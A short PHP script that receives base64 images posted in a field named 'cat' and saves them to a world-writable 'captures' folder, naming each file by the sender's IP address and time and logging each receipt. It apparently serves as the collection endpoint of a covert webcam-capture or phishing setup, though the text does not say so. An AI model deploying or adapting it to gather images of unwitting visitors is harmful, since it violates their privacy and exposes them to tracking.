<?php
error_reporting(E_ALL);

if (empty($_POST['cat'])) {
    exit();
}

$saveDir = 'captures';
if (!file_exists($saveDir)) {
    mkdir($saveDir, 0777, true);
}

$ip = $_SERVER['REMOTE_ADDR'];
$safe_ip = str_replace([':', '.'], '_', $ip); 
$filename = $saveDir . '/img_' . $safe_ip . '_' . date('Y-m-d_H-i-s') . '.png';

$data = $_POST['cat'];

if (strpos($data, ',') !== false) {
    $parts = explode(',', $data);
    $data = $parts[1]; 
}

$data = str_replace(' ', '+', $data);

$unencodedData = base64_decode($data);

if ($unencodedData !== false) {
    file_put_contents($filename, $unencodedData);
    
    file_put_contents('Log.log', "Received\r\n", FILE_APPEND);
}

exit();
?>